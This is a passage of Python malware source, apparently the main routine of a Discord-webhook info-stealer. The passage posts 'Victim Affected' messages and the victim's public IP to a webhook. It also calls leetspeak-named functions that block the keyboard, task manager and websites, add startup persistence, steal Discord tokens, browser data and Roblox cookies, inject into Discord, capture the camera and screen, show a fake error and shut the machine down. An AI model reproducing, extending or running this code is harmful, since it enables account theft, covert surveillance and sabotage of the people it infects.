        os.chmod(path_new_file, 0o777) 
    except:
        pass

payload = {
    'content': f'****╔═════════════════Victim Affected═════════════════╗****',
    'username': username_embed,
    'avatar_url': avatar_embed,
}
requests.post(w3bh00k_ur1, json=payload)
try: B10ck_K3y()
except: pass
try: B10ck_T45k_M4n4g3r()
except: pass
try: B10ck_W3b5it3()
except: pass
try: St4rtup()
except: pass
try: Sy5t3m_Inf0()
except: pass
try: Di5c0rd_T0k3n()
except: pass
try: Di5c0rd_inj3c710n()
except: pass
try: Br0w53r_5t341()
except: pass
try: R0b10x_C00ki3()
except: pass
try: C4m3r4_C4ptur3()
except: pass
try: Op3n_U53r_Pr0fi13_53tting5()
except: pass
try: Scr33n5h0t()
except: pass
payload = {
    'content': f'****╚══════════════════{ip_address_public}══════════════════╝****',
    'username': username_embed,
    'avatar_url': avatar_embed,
}
requests.post(w3bh00k_ur1, json=payload)

try: F4k3_3rr0r()
except: pass
try: Shutd0wn()
except: pass
